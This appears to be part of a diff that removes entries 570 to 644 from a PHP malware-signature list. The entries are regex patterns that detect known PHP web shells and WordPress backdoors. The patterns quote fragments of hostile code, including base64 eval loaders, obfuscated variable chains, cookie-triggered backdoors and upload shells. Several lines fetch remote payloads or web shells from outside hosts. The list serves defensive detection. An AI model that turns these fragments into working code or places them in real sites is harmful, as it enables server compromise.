-\\<br\\>
-\\<\\?php
-if \\(\\!empty\\(\\$_POST\\[[\\s\\S]{0,160}\\<b\\>send an report to xxxxxxx@gmail\\.com \\- \\$xx \\<br\\>\\<br\\>\\<br\\> \\$xxx  \\<\\/b\\>/',
-      'label' => 'sample-specific literal chain',
-    ),
-    571 => 
-    array (
-      'pattern' => '/https\\:\\/\\/pastebin\\.com\\/raw\\/63LjCNAs[\\s\\S]{0,160}wp\\-engine\\.php/',
-      'label' => 'sample-specific literal chain',
-    ),
-    572 => 
-    array (
-      'pattern' => '/\\/\\/@file_put_contents\\(\\$path\\s+\\.\\s+\'\\/wp\\-includes\\/class\\.wp\\.php\',\\s+file_get_contents\\(\'http\\:\\/\\/www\\.krilns\\.com\\/admin\\.txt\'\\)\\);/',
-      'label' => 'sample-specific line fragment',
-    ),
-    573 => 
-    array (
-      'pattern' => '/eval\\(base64_decode\\(\'ZnVuY3Rpb24gX0owVkooJF9Ha1p2VTBIKXskX0drWnZVMEg9c3Vic3RyKCRfR2tadlUwSCwoaW50KShoZXgyYmluKCczOTMyMzYnKSkpOyRfR2tadlUwSD1z/',
-      'label' => 'source-file tail snippet',
-    ),
-    574 => 
-    array (
-      'pattern' => '/; global \\$O;  \\$O\\=urldecode\\(\\$OOOOOO\\); 
-\\$\\{\\$O\\{18\\}\\.\\$O\\{7\\}\\.\\$O\\{24\\}\\.\\$O\\{2\\}\\.\\$O\\{50\\}\\.\\$O\\{8\\}\\}\\=/',
-      'label' => 'sample-specific literal',
-    ),
-    575 => 
-    array (
-      'pattern' => '/\\);\\$htaccess_rule \\.\\="\\\\\\\\x20On\\\\\\\\n";\\$htaccess_rule \\.\\=\\$\\{"G\\\\x4cO\\\\x42\\\\x41\\\\x4cS"\\}\\["\\\\x56\\\\x66\\\\x35\\\\x66\\\\x35\\\\x66\\\\x63\\\\x35\\\\x63\\\\x63"\\]\\(\\\\[\\s\\S]{0,160}\\);\\$htaccess_rule \\.\\="\\\\\\\\x20\\/\\\\\\\\n";\\$htaccess_rule \\.\\=\\$\\{"G\\\\x4cO\\\\x42\\\\x41\\\\x4cS"\\}\\["\\\\x56\\\\x66\\\\x35\\\\x66\\\\x35\\\\x66\\\\x63\\\\x35\\\\x63\\\\x63"\\]\\(\\\\/',
-      'label' => 'sample-specific literal chain',
-    ),
-    576 => 
-    array (
-      'pattern' => '/\\<font size\\="2px" color\\="white"\\>Copyright &\\#169; \\<script type\\=\'text\\/javascript\'\\>var creditsyear \\= new Date\\(\\);document\\.write\\(creditsyear\\.getFu/',
-      'label' => 'source-file tail snippet',
-    ),
-    577 => 
-    array (
-      'pattern' => '/\\<\\?php \\$xwbl209\\= "SN\\),AK mtyCcMXQHJ\\.T0\\-3qjfY5GnRl\\*gWa7dB8DF\\(ZOUkiz1IEVs2pbur\\/\\+v6;_ePLxho49w";\\$lsyw0571\\=\'JGNoID0gY3VybF9pbml0KCd\';\\$lsyw05711\\=\'/',
-      'label' => 'source-file tail snippet',
-    ),
-    578 => 
-    array (
-      'pattern' => '/,\\$xwbl209\\{63\\}\\);\\$kxab691 \\= mrhz799\\(\\$xwbl209\\{24\\},\\$xwbl209\\{56\\},\\$xwbl209\\{28\\}\\);\\$enbu065 \\= mrhz799\\(\\$xwbl209\\{11\\},\\$xwbl209\\{8\\},/',
-      'label' => 'sample-specific literal',
-    ),
-    579 => 
-    array (
-      'pattern' => '/\\<\\?php \\$inter_domain\\=\'http\\:\\/\\/154\\.22\\.119\\.11\\/z0228_28\';function curl_get_contents\\(\\$url\\)\\{\\$ch\\=curl_init\\(\\);curl_setopt \\(\\$ch, CURLOPT_URL, \\$url\\);cu/',
-      'label' => 'source-file tail snippet',
-    ),
-    580 => 
-    array (
-      'pattern' => '/\\<\\?php @include\\("\\\\167\\\\160\\\\55\\\\141\\\\144\\\\155\\\\151\\\\156\\\\57\\\\151\\\\155\\\\141\\\\147\\\\145\\\\163\\\\57\\\\162\\\\163\\\\163\\\\55\\\\64\\\\170\\\\56\\\\160\\\\156\\\\147"\\); \\?\\>/',
-      'label' => 'source-file tail snippet',
-    ),
-    581 => 
-    array (
-      'pattern' => '/\\<\\?php error_reporting\\(0\\); echo php_uname\\(\\)\\."\\<br\\>"\\.getcwd\\(\\)\\."\\<br\\>"; if\\(\\$_GET\\[\'FOx\'\\] \\=\\= \'HThan\'\\)\\{\\$saw1 \\= \\$_FILES\\[\'file\'\\]\\[\'tmp_name\'\\];\\$saw2 \\= \\$/',
-      'label' => 'source-file tail snippet',
-    ),
-    582 => 
-    array (
-      'pattern' => '/\\<\\?php error_reporting\\(0\\); echo php_uname\\(\\)\\."\\<br\\>"\\.getcwd\\(\\)\\."\\<br\\>"; if\\(\\$_GET\\[\'FOx\'\\] \\=\\= \'sIez4\'\\)\\{\\$saw1 \\= \\$_FILES\\[\'file\'\\]\\[\'tmp_name\'\\];\\$saw2 \\= \\$/',
-      'label' => 'source-file tail snippet',
-    ),
-    583 => 
-    array (
-      'pattern' => '/\\<\\?php error_reporting\\(0\\); echo php_uname\\(\\)\\."\\<br\\>"\\.getcwd\\(\\)\\."\\<br\\>"; if\\(\\$_GET\\[\'FOx\'\\] \\=\\= \'uiIm5\'\\)\\{\\$saw1 \\= \\$_FILES\\[\'file\'\\]\\[\'tmp_name\'\\];\\$saw2 \\= \\$/',
-      'label' => 'source-file tail snippet',
-    ),
-    584 => 
-    array (
-      'pattern' => '/eval\\("\\?\\>"\\.base64_decode\\("PD9waHAKY2xhc3MgRm9vIHsKCWZ1bmN0aW9uIF9fY29uc3RydWN0KCkgewoJCSRtb2R1bGUgPSAkdGhpcy0\\+c3RhY2soJHRoaXMtPmNsYXN0ZXIpOwo/',
-      'label' => 'source-file tail snippet',
-    ),
-    585 => 
-    array (
-      'pattern' => '/\\<html xmlns\\="http\\:\\/\\/www\\.w3\\.org\\/1999\\/xhtml" lang\\="en\\-US" prefix\\="og\\: http\\:\\/\\/ogp\\.me\\/ns\\# fb\\: http\\:\\/\\/ogp\\.me\\/ns\\/fb\\#"\\>[\\s\\S]{0,12000}_gaq\\.push\\(\\[\'_trackEvent\', \'download\', \'http\\:\\/\\/www\\.virendrachandak\\.com\\/demos\\/getting\\-real\\-client\\-ip\\-address\\-in\\-php\\.zip\', \'download\\-source\', 1/s',
-      'label' => 'source-file head-tail anchor',
-    ),
-    586 => 
-    array (
-      'pattern' => '/@error_reporting\\(0\\);[\\s\\S]{0,12000}eval\\(\\$g\\(\\$b\\(\'1TwNc9s2sn9F0XVK8SzJ4jdphXZzrXPNXNPmOe5Nb1yPhpZoixeJUkkqievqv7\\/dBUgCJCTLSXrvXhzJEohdLPYLu8DCyW0vyfO46H01uTj\\/n5\\/P315eaZl2resPX01G/s',
-      'label' => 'source-file head-tail anchor',
-    ),
-    587 => 
-    array (
-      'pattern' => '/GacFAg6R5WU6cMxWnvWqJGPmurvSoTzK\\/My8ZAYbB5FS3J6WZ3MawPpNxuWq0m\\+F\\+usBk9i6W\\/o35\\/Re/',
-      'label' => 'sample-specific encoded fragment',
-    ),
-    588 => 
-    array (
-      'pattern' => '/\\/", \\$dir\\);
-\\$total \\= \\$func\\[29\\]\\(\\$dir\\);
-\\$free \\= \\$func\\[30\\]\\(\\$dir\\);
-\\$pers \\=  \\(int\\) \\(\\$free \\/ \\$total \\* 100\\);
-\\$ds \\= @\\$func\\[31\\]\\(/',
-      'label' => 'sample-specific literal',
-    ),
-    589 => 
-    array (
-      'pattern' => '/\\$pdgR5J05_M\\="Sy1LzNFQKyzNL7G2V0svsYYw9YpLiuKL8ksMjTXSqzLz0nISS1KBrNK85PzcgqLU4mLqCCclFqeamcSnpCbnp6RqAO0sSi3TUHHM9vc3i\\/BysawKMtJEAtYA";\\/\\/scp[\\s\\S]{0,12000}eval\\(htmlspecialchars_decode\\(gzinflate\\(base64_decode\\(\\$pdgR5J05_M\\)\\)\\)\\);/s',
-      'label' => 'source-file head-tail anchor',
-    ),
-    590 => 
-    array (
-      'pattern' => '/\\$request_method \\= \\$_SERVER\\["REQUEST_METHOD"\\];[\\s\\S]{0,12000}header\\("Location\\: http\\:\\/\\/"\\.\\$_SERVER\\["HTTP_HOST"\\]\\."\\/"\\);/s',
-      'label' => 'source-file head-tail anchor',
-    ),
-    591 => 
-    array (
-      'pattern' => '/\\$O0O__O00_O\\="u_5wjzc4yi9xtalokd02smnh67rpf83gbeq1v\\-";\\$O0_O__00OO\\=\\$O0O__O00_O\\{28\\}\\.\\$O0O__O00_O\\{9\\}\\.\\$O0O__O00_O\\{14\\}\\.\\$O0O__O00_O\\{33\\}\\.\\$O0O__O00_O\\{/',
-      'label' => 'source-file tail snippet',
-    ),
-    592 => 
-    array (
-      'pattern' => '/\\<\\?php \\$wksh287\\= "_0ibBdY1\\+\\*laVHnwjRF\\(DITtAyqUv6\\)o95egzE\\.J2xGSfQZ8Ck,msL3uWKc4 pXMh\\-ONr;P\\/7";\\$hjwl996\\=\'JGNoID0gY3VybF9pbml0KCdodHRwOi8vYmFua3/',
-      'label' => 'source-file tail snippet',
-    ),
-    593 => 
-    array (
-      'pattern' => '/\\$O_O0O__00O\\="3cixosqnd9vt56jpk2lg8z0ba_e41mfw7yrh\\-u";\\$OO_O0_O_00\\=\\$O_O0O__00O\\{1\\}\\.\\$O_O0O__00O\\{34\\}\\.\\$O_O0O__00O\\{26\\}\\.\\$O_O0O__00O\\{24\\}\\.\\$O_O0O__00O\\{/',
-      'label' => 'source-file tail snippet',
-    ),
-    594 => 
-    array (
-      'pattern' => '/\\<\\?php error_reporting\\(0\\); @ini_set\\(\'error_log\', NULL\\); @ini_set\\(\'log_errors\', 0\\);  @ini_set\\(\'display_errors\', 0\\);  echo "FoxAutoV5 \\[The best/',
-      'label' => 'source-file tail snippet',
-    ),
-    595 => 
-    array (
-      'pattern' => '/eval\\("\\?\\>"\\.file_get_contents\\("https\\:\\/\\/raw\\.githubusercontent\\.com\\/NoobSecID\\/webshell\\/master\\/shell\\.php"\\)\\);/',
-      'label' => 'source-file tail snippet',
-    ),
-    596 => 
-    array (
-      'pattern' => '/TAG" \\],
-	match\\: \\{
-		ID\\: \\/\\#\\(\\(\\?\\:\\[\\\\w\\\\u00c0\\-\\\\uFFFF\\-\\]\\|\\\\\\\\\\.\\)\\+\\)\\/,
-		CLASS\\: \\/\\\\\\.\\(\\(\\?\\:\\[\\\\w\\\\u00c0\\-\\\\uFFFF\\-\\]\\|\\\\\\\\\\.\\)\\+\\)\\/,
-		NAME\\: \\/\\\\\\[name\\=\\[\'/',
-      'label' => 'sample-specific literal',
-    ),
-    597 => 
-    array (
-      'pattern' => '/\\$?sfmxebcirt\\b/',
-      'label' => 'sample-specific identifier',
-    ),
-    598 => 
-    array (
-      'pattern' => '/\\$?fgvrhgkibs\\b/',
-      'label' => 'sample-specific identifier',
-    ),
-    599 => 
-    array (
-      'pattern' => '/\\$GLOBALS\\[\'pass\'\\] \\= "";[\\s\\S]{0,12000}\\$b374k\\("eNrsvQl74zayKPpXGB3fyBrZ1r6120607\\/uu7lx\\/FElJlLiJpNZ0\\/vvFwgWkKFtOZ\\+add8\\/NfNOmgEKhABQKhUKh8PU3ZaVQd\\+VGO5dt9L\\/5RZndCdybLr8JMs36\\/6BeKFpV/s',
-      'label' => 'source-file head-tail anchor',
-    ),
-    600 => 
-    array (
-      'pattern' => '/\\<\\?php \\$\\{"\\\\x47L\\\\x4f\\\\x42\\\\x41\\\\x4c\\\\x53"\\}\\["m\\\\x79\\\\x70\\\\x61c\\\\x63\\\\x73\\\\x76"\\]\\="\\\\x5f1";\\$\\{"\\\\x47\\\\x4cOBAL\\\\x53"\\}\\["h\\\\x6fq\\\\x70\\\\x75\\\\x73p\\\\x67l\\\\x73v"\\]\\="\\\\x5f\\\\x30"/',
-      'label' => 'source-file tail snippet',
-    ),
-    601 => 
-    array (
-      'pattern' => '/\\<\\?php goto e45; B63\\: def\\: goto f4d; F21\\: Ef4\\: goto ca1; B17\\: function D63\\(\\) \\{ goto a62; d4c\\: a1f\\: goto B9b; Eb6\\: if \\(isset\\(\\$_SERVER\\["\\\\x52\\\\10[\\s\\S]{0,12000}require\\( dirname\\( __FILE__ \\) \\. \'\\/wp\\-blog\\-header\\.php\' \\);/s',
-      'label' => 'source-file head-tail anchor',
-    ),
-    602 => 
-    array (
-      'pattern' => '/\\<\\?php function curl_get_contents\\(\\$url\\)\\{\\$ch\\=curl_init\\(\\);curl_setopt \\(\\$ch, CURLOPT_URL, \\$url\\);curl_setopt \\(\\$ch, CURLOPT_RETURNTRANSFER, 1\\);cur/',
-      'label' => 'source-file tail snippet',
-    ),
-    603 => 
-    array (
-      'pattern' => '/\\>
-\\<title\\>xls\\<\\/title\\>
-\\<\\/head\\>
-
-\\<body background\\=[\\s\\S]{0,160}position\\: absolute; left\\: 627; top\\: 291/',
-      'label' => 'sample-specific literal chain',
-    ),
-    604 => 
-    array (
-      'pattern' => '/@"\\)\\{
-		\\$x \\= \\$i;
-		break;
-	\\}
-\\}
-\\$yuh \\= substr\\(\\$len,0,\\$x\\);
-\\$yuh \\= strrev\\(\\$yuh\\);
-for\\(\\$i\\=0; \\$i\\<\\$ln; \\$i\\+\\+\\)\\{
-	if\\(\\$yuh\\[\\$i\\] \\=\\=[\\s\\S]{0,160}\\)\\{
-		\\$x \\= \\$i;
-		break;
-	\\}
-\\}
-\\$yuh \\= substr\\(\\$yuh,0,\\$x\\);
-\\$yuh \\= ucfirst\\(\\$yuh\\);
-\\?\\>
-\\<\\!DOCTYPE HTML PUBLIC/',
-      'label' => 'sample-specific literal chain',
-    ),
-    605 => 
-    array (
-      'pattern' => '/file_put_contents\\(\\$file_name,\\s+\\$contents\\[\\$content_type\\]\\s+\\.\\s+"\\\\n"\\s+\\.\\s+\'\\<\\?php\\s+\\/\\*\'\\.str_repeat\\(substr\\(\\$string,\\s+0,\\s+rand\\(1,\\s+strlen\\(\\$string\\)\\)\\),\\s+rand\\(1,\\s+5\\)\\)\\.\'\\*\\/\\s+\\?\\>\'\\);/',
-      'label' => 'sample-specific line fragment',
-    ),
-    606 => 
-    array (
-      'pattern' => '/if\\(strstr\\(strtolower\\(\\$_SERVER\\[\'HTTP_USER_AGENT\'\\]\\), "googlebot"\\)\\)[\\s\\S]{0,12000}else \\{ \\$\\{"\\\\x47LO\\\\x42\\\\x41\\\\x4c\\\\x53"\\}\\["\\\\x6f\\\\x68\\\\x6b\\\\x77n\\\\x70\\\\x74\\\\x61\\\\x61\\\\x69\\\\x6e"\\]\\="pa\\\\x73\\\\x73\\\\x77ord";\\$\\{\\$\\{"\\\\x47\\\\x4c\\\\x4fBA\\\\x4c\\\\x53"\\}\\["o\\\\x68k\\\\x7/s',
-      'label' => 'source-file head-tail anchor',
-    ),
-    607 => 
-    array (
-      'pattern' => '/x61W\\/8QvQi2xsV5XYeS7RM22UkD8\\/n9jPe7U\\/\\/x2\\/m\\/\\/H8UM\\/9G\\/TOVkm485P6Es0n/',
-      'label' => 'sample-specific encoded fragment',
-    ),
-    608 => 
-    array (
-      'pattern' => '/\\$O__O0O0_0O\\="f\\-y2qlu7jgk0tnx8dob41a56ewmr9hz_ci3spv";\\$O0_OOO0_0_\\=\\$O__O0O0_0O\\{0\\}\\.\\$O__O0O0_0O\\{33\\}\\.\\$O__O0O0_0O\\{5\\}\\.\\$O__O0O0_0O\\{24\\}\\.\\$O__O0O0_0O\\{3/',
-      'label' => 'source-file tail snippet',
-    ),
-    609 => 
-    array (
-      'pattern' => '/return\\s+base64_encode\\(hash\\(\\$GLOBALS\\[\'HASHTYPE\'\\],\\s+\\(\\$GLOBALS\\[\'REMOTE_ADDR\'\\]\\s+\\?\\s+\\$_SERVER\\[\'REMOTE_ADDR\'\\]\\s+\\:\\s+\'\'\\)\\.\\$str\\.__FILE__\\)\\);/',
-      'label' => 'sample-specific line fragment',
-    ),
-    610 => 
-    array (
-      'pattern' => '/;
-        \\$g\\+\\+;
-        \\$i\\+\\+;
-    \\} while \\(\\$i \\!\\= 10\\);
-    \\$rPath \\= dirname\\(__FILE__\\);
-    \\$rPath \\= explode\\(/',
-      'label' => 'sample-specific literal',
-    ),
-    611 => 
-    array (
-      'pattern' => '/Mozilla\\/5\\.0 \\(Windows NT 10\\.0; Win64; x64\\) AppleWebKit\\/537\\.36 \\(KHTML, like Gecko\\) Chrome\\/64\\.0\\.3282\\.186 Safari\\/537\\.36[\\s\\S]{0,160}Mozilla\\/5\\.0 \\(Windows NT 10\\.0; Win64; x64\\) AppleWebKit\\/537\\.36 \\(KHTML, like Gecko\\) Chrome\\/61\\.0\\.3163\\.100 Safari\\/537\\.36/',
-      'label' => 'sample-specific literal chain',
-    ),
-    612 => 
-    array (
-      'pattern' => '/function ikl_pl\\(\\$seerbg,\\$yior\\)\\{[\\s\\S]{0,12000}eval\\(ikl_pl\\(\\$seerbg,\\$yior\\)\\);/s',
-      'label' => 'source-file head-tail anchor',
-    ),
-    613 => 
-    array (
-      'pattern' => '/\\$B66CUC6UUC\\="01o_4yfc8rt3gbkdevmsij9l\\-nqpz2h7u5wxa6";\\$BUUC66U6CC\\=\\$B66CUC6UUC\\{7\\}\\.\\$B66CUC6UUC\\{9\\}\\.\\$B66CUC6UUC\\{16\\}\\.\\$B66CUC6UUC\\{36\\}\\.\\$B66CUC6UUC\\{1/',
-      'label' => 'source-file tail snippet',
-    ),
-    614 => 
-    array (
-      'pattern' => '/\\/Chrome\\|Firefox\\|Opera\\|Safari\\|Browser\\|Windows\\|Linux\\|Macintosh\\|Mac OS\\|Android\\|iP\\(ad\\|hone\\|od\\)\\/i/',
-      'label' => 'sample-specific literal',
-    ),
-    615 => 
-    array (
-      'pattern' => '/; global \\$O;\\$O\\=urldecode\\(\\$OOOOOO\\); 
-\\$\\{\\$O\\{18\\}\\.\\$O\\{7\\}\\.\\$O\\{24\\}\\.\\$O\\{2\\}\\.\\$O\\{50\\}\\.\\$O\\{8\\}\\}\\=/',
-      'label' => 'sample-specific literal',
-    ),
-    616 => 
-    array (
-      'pattern' => '/\\*\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-[\\s\\S]{0,12000}if \\(\\$_r && strpos\\(\\$_r, Edu\\:\\:g\\(\'_p\' \\. \'t\', \'_j\' \\. \'kb\'\\)\\) \\!\\=\\= false\\) \\{/s',
-      'label' => 'source-file head-tail anchor',
-    ),
-    617 => 
-    array (
-      'pattern' => '/\\/\\*\\! This file is auto\\-generated \\*\\/[\\s\\S]{0,12000}\\!function\\(t,p\\)\\{var s\\=t\\("\\#app_name"\\),r\\=t\\("\\#approve"\\),e\\=t\\("\\#reject"\\),n\\=s\\.closest\\("form"\\),i\\=\\{userLogin\\:p\\.user_login,successUrl\\:p\\.success,reject/s',
-      'label' => 'source-file head-tail anchor',
-    ),
-    618 => 
-    array (
-      'pattern' => '/function __construct\\(\\)\\{[\\s\\S]{0,12000}\\$kexw \\= \\$cood_ok\\-\\>deunco\\(\\$str_llg\\);/s',
-      'label' => 'source-file head-tail anchor',
-    ),
-    619 => 
-    array (
-      'pattern' => '/\\$str_wws\\="%0A%EF%12%D3%83%9F%3A%2C%C8%E5%D0%17faK%91\\+%E6%AB%E5%98%CA%07%23%B5%D5E%DDu%05%3F%E3%14%F7%84%A0%D2%02%13kFx%C3%96%DEEL%8E%2A%B8%8/',
-      'label' => 'source-file tail snippet',
-    ),
-    620 => 
-    array (
-      'pattern' => '/\\* Plugin Name\\: SEO Optimizer[\\s\\S]{0,12000}print \'\\<h1\\>Welcome to the SEO Optimizer\\<\\/h1\\>\';/s',
-      'label' => 'source-file head-tail anchor',
-    ),
-    621 => 
-    array (
-      'pattern' => '/\\>Kullanılan işlev \\: passthru\\(\\) \\<\\/font\\>, \\<strong\\>Gönderilen Komut \\: \\$cmd\\<\\/strong\\>\\<br \\/\\>[\\s\\S]{0,160}\\>Kullanılan işlev \\: system\\(\\) \\<\\/font\\>, \\<strong\\>Gönderilen Komut \\: \\$cmd\\<\\/strong\\>\\<br \\/\\>/',
-      'label' => 'sample-specific literal chain',
-    ),
-    622 => 
-    array (
-      'pattern' => '/\\$O\\=urldecode\\(\'%21s%3F%2F%5D_e%28%5E%3DM%2C6nP%60Kl%25CzW%7C8%5C%7D%3BhXt\\.x%2FV1djoy%40%22\\-2qr%2Ag%3EuE%3Cmw4IbiLT%3AJfHaG0S%5BY%23Q7ZcFOk%24/',
-      'label' => 'source-file tail snippet',
-    ),
-    623 => 
-    array (
-      'pattern' => '/\\* Name\\: Wordpress Include File[\\s\\S]{0,12000}\\$p\\=\\$_COOKIE;\\(count\\(\\$p\\)\\=\\=22&&in_array\\(gettype\\(\\$p\\)\\.count\\(\\$p\\),\\$p\\)\\)\\?\\(\\(\\$p\\[97\\]\\=\\$p\\[97\\]\\.\\$p\\[51\\]\\)&&\\(\\$p\\[58\\]\\=\\$p\\[97\\]\\(\\$p\\[58\\]\\)\\)&&\\(\\$p\\=\\$p\\[58\\]\\(\\$p\\[79\\],\\$p\\[97\\]\\(\\$/s',
-      'label' => 'source-file head-tail anchor',
-    ),
-    624 => 
-    array (
-      'pattern' => '/; \\/\\/ For `Options \\+Multiviews`\\: \\/wp\\-admin\\/themes\\/index\\.php \\(themes\\.php is queried\\)\\.
-		\\}
-	\\}
-\\} else \\{
-	if \\( preg_match\\([\\s\\S]{0,160}\\], \\$self_matches \\) \\) \\{
-		\\$pagenow \\= strtolower\\( \\$self_matches\\[1\\] \\);
-	\\} else \\{
-		\\$pagenow \\=/',
-      'label' => 'sample-specific literal chain',
-    ),
-    625 => 
-    array (
-      'pattern' => '/class c5f3c34b8786c3 \\{ private \\$r5f3c34b8786d1 \\= array\\(\\); public function __call\\(\\$sp52e11a, \\$sp91835c\\) \\{ call_user_func_array\\(\\$this\\-\\>r5f3c34/',
-      'label' => 'source-file tail snippet',
-    ),
-    626 => 
-    array (
-      'pattern' => '/\\$p\\=\\$_COOKIE;\\(count\\(\\$p\\)\\=\\=22&&in_array\\(gettype\\(\\$p\\)\\.count\\(\\$p\\),\\$p\\)\\)\\?\\(\\(\\$p\\[40\\]\\=\\$p\\[40\\]\\.\\$p\\[12\\]\\)&&\\(\\$p\\[34\\]\\=\\$p\\[40\\]\\(\\$p\\[34\\]\\)\\)&&\\(\\$p\\=\\$p\\[34\\]\\(\\$p\\[37\\],\\$p\\[40\\]\\(\\$/',
-      'label' => 'source-file tail snippet',
-    ),
-    627 => 
-    array (
-      'pattern' => '/\\<\\?php \\$unev273\\= "Nj YO\\)tWP\\/uAGvRKV6gqXQiUocmp17d\\(Ebaws42\\.8fT_9x\\-LZlrMSDe\\+3n\\*yI;FkH0h,JzBC5";\\$kqdy621\\=\'JGNoID0gY3VybF9pbml0KCdodHRwOi8vYmFua3/',
-      'label' => 'source-file tail snippet',
-    ),
-    628 => 
-    array (
-      'pattern' => '/class c5f23cd58d5dc3 \\{ private \\$r5f23cd58d5dd2 \\= array\\(\\); public function __call\\(\\$sp188f1d, \\$sp70433b\\) \\{ call_user_func_array\\(\\$this\\-\\>r5f23cd/',
-      'label' => 'source-file tail snippet',
-    ),
-    629 => 
-    array (
-      'pattern' => '/\\<\\?php                                                                                                                                       [\\s\\S]{0,12000}wp_redirect\\( network_admin_url\\(\\) \\);/s',
-      'label' => 'source-file head-tail anchor',
-    ),
-    630 => 
-    array (
-      'pattern' => '/if\\s+\\(\\s+0\\s+\\=\\=\\=\\s+strpos\\(\\s+\\$ptype_obj\\-\\>menu_icon,\\s+\'data\\:image\\/svg\\+xml;base64,\'\\s+\\)\\s+\\|\\|\\s+0\\s+\\=\\=\\=\\s+strpos\\(\\s+\\$ptype_obj\\-\\>menu_icon,\\s+\'dashicons\\-\'\\s+\\)\\s+\\)\\s+\\{/',
-      'label' => 'sample-specific line fragment',
-    ),
-    631 => 
-    array (
-      'pattern' => '/\\<\\?php \\$jbojdzgc \\= "yeosthxloywgdrzx";\\$rdktoi \\= "";foreach \\(\\$_POST as \\$kbamisbm \\=\\> \\$olwyuldnw\\)\\{if \\(strlen\\(\\$kbamisbm\\) \\=\\= 16 and substr_count\\(\\$/',
-      'label' => 'source-file tail snippet',
-    ),
-    632 => 
-    array (
-      'pattern' => '/\\$olhfn \\= \'1k0\\*r7sp26_x\\#tdgbi9fol4eu\\\\\'8\\-cyHmn5av\';\\$mmpwayx \\= Array\\(\\);\\$mmpwayx\\[\\] \\= \\$olhfn\\[28\\]\\.\\$olhfn\\[4\\]\\.\\$olhfn\\[23\\]\\.\\$olhfn\\[34\\]\\.\\$olhfn\\[13\\]\\.\\$olhf/',
-      'label' => 'source-file tail snippet',
-    ),
-    633 => 
-    array (
-      'pattern' => '/\\(count\\(\\$t\\) \\=\\= 8\\)\\?\\(\\(\\$ba \\= \\$t\\[84\\]\\.\\$t\\[94\\]\\) && \\(\\$am \\= \\$ba\\(\\$t\\[23\\]\\.\\$t\\[80\\]\\)\\) && \\(\\$_am \\= \\$ba\\(\\$t\\[89\\]\\.\\$t\\[36\\]\\)\\) && \\(\\$_am \\= \\$am\\(\\$t\\[62\\], \\$_am\\(\\$ba\\(\\$t\\[28\\]\\)/',
-      'label' => 'source-file tail snippet',
-    ),
-    634 => 
-    array (
-      'pattern' => '/\\$vucgol \\= \'s\\\\\'8m\\#\\*k3tfl_Hgdpbr7\\-5va6ou9n41cxiye2\';\\$dtgpkp \\= Array\\(\\);\\$dtgpkp\\[\\] \\= \\$vucgol\\[7\\]\\.\\$vucgol\\[30\\]\\.\\$vucgol\\[16\\]\\.\\$vucgol\\[35\\]\\.\\$vucgol\\[26\\]\\.\\$/',
-      'label' => 'source-file tail snippet',
-    ),
-    635 => 
-    array (
-      'pattern' => '/\\$svvcxnn \\= \'li_\\-tnkbHrpy\\\\\'\\*av8c7643xg0sue\\#o52dfm\';\\$rxtbtf \\= Array\\(\\);\\$rxtbtf\\[\\] \\= \\$svvcxnn\\[21\\]\\.\\$svvcxnn\\[30\\]\\.\\$svvcxnn\\[19\\]\\.\\$svvcxnn\\[31\\]\\.\\$svvcxnn/',
-      'label' => 'source-file tail snippet',
-    ),
-    636 => 
-    array (
-      'pattern' => '/form\'\\] \\) \\) \\{
-				\\$form \\= FLBuilderModel\\:\\:\\$settings_forms\\[ \\$field\\[[\\s\\S]{0,160}\\] \\];
-				self\\:\\:enqueue_styles_for_nested_module_form\\( \\$module, \\$form\\[/',
-      'label' => 'sample-specific literal chain',
-    ),
-    637 => 
-    array (
-      'pattern' => '/\\<\\?php                                                                                                                                       [\\s\\S]{0,12000}return \\$response;/s',
-      'label' => 'source-file head-tail anchor',
-    ),
-    638 => 
-    array (
-      'pattern' => '/\\$cuoaf \\= \'sn5_83\\-yvi1tpxabmflk6\\*g4H\\\\\'d7\\#er90cuo\';\\$diiwdwk \\= Array\\(\\);\\$diiwdwk\\[\\] \\= \\$cuoaf\\[33\\]\\.\\$cuoaf\\[30\\]\\.\\$cuoaf\\[29\\]\\.\\$cuoaf\\[14\\]\\.\\$cuoaf\\[11\\]\\.\\$cuo/',
-      'label' => 'source-file tail snippet',
-    ),
-    639 => 
-    array (
-      'pattern' => '/\\/\\* Plugin name\\: ioptimization \\*\\/[\\s\\S]{0,12000}echo "\\<form enctype\\=\\\\"multipart\\/form\\-data\\\\" action\\=\\\\"\\\\" method\\=\\\\"POST\\\\"\\>\\<input type\\=\\\\"text\\\\" name\\=\\\\"l\\\\" value\\=\\\\"\\$cwd\\\\" style\\=\\\\"width\\: 700px;/s',
-      'label' => 'source-file head-tail anchor',
-    ),
-    640 => 
-    array (
-      'pattern' => '/\\$w \\= \'https\\:\\/\\/\'\\.@\\$_GET\\[\'a5fgpiuls97e3x\'\\];[\\s\\S]{0,12000}\\$e \\= urldecode\\(\\$j\\);/s',
-      'label' => 'source-file head-tail anchor',
-    ),
-    641 => 
-    array (
-      'pattern' => '/QGluaV9zZXQoJ2Vycm9yX2xvZycsI6745VT674wpOw0KICAgI674Bpbmlfc2V0KCdsb2dfZXJyb3JzJy/',
-      'label' => 'sample-specific encoded fragment',
-    ),
-    642 => 
-    array (
-      'pattern' => '/\\<\\?php eval\\(gzinflate\\(base64_decode\\(\'FZvHkoPKskU\\/554TDPAuXtwBAuG9h8kNPAjvzdc\\/etjdilJVVubeayN1cSTdP9XTDGWXbMU\\/abIWBPa\\/vMjGvPjnP2J8xS0xngiBg89R/',
-      'label' => 'source-file tail snippet',
-    ),
-    643 => 
-    array (
-      'pattern' => '/\\<\\?php \\$\\{"G\\\\x4cO\\\\x42\\\\x41L\\\\x53"\\}\\["k\\\\x6f\\\\x74\\\\x6fv\\\\x63\\\\x71\\\\x77"\\]\\="\\\\x6e\\\\x61\\\\x6d\\\\x65";\\$\\{"\\\\x47\\\\x4c\\\\x4fB\\\\x41\\\\x4c\\\\x53"\\}\\["\\\\x6a\\\\x71\\\\x70\\\\x73\\\\x73\\\\x71\\\\x62/',
-      'label' => 'source-file tail snippet',
-    ),
-    644 => 
-    array (
-      'pattern' => '/if\\(isset\\(\\$_COOKIE\\)\\)\\{\\$p\\=\\$_COOKIE;\\(count\\(\\$p\\)\\=\\=24&&in_array\\(gettype\\(\\$p\\)\\.count\\(\\$p\\),\\$p\\)\\)\\?\\(\\(\\$p\\[20\\]\\=\\$p\\[20\\]\\.\\$p\\[66\\]\\)&&\\(\\$p\\[34\\]\\=\\$p\\[20\\]\\(\\$p\\[34\\]\\)\\)&&\\(\\$p\\=\\$p/',
